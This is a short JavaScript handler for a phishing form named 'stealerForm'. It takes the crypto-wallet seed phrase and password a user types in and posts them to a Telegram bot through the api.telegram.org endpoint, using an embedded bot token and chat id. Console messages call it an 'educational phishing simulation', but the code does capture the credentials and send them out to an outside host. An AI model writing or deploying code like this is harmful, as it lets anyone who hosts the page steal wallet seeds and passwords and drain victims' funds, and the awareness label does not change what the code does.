document.getElementById("stealerForm").addEventListener("submit", function(e) {
  e.preventDefault();
  const wallet = document.getElementById("wallet").value;
  const password = document.getElementById("password").value;

  // Awareness Alert
  console.log("%c⚠️ WARNING! NEVER share your seed phrase.", "color: red; font-size: 16px;");
  console.log("This is a phishing simulation for educational purposes only.");

  // Show phishing caught message
  document.getElementById("response").innerText = "🚨 Phishing Attempt Detected! Credentials captured for awareness log.";

  // (Optional) Send to Telegram for demonstration purposes
  fetch("https://api.telegram.org/bot7986200355:AAE5W_YXK5RSVgHBCqOrBiurWmNpbTPPL7Q
        /sendMessage", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: "6697993658",
      text: `⚠️ [AWARENESS LOG]\nSeed: ${wallet}\nPassword: ${password}`
    })
  });
});
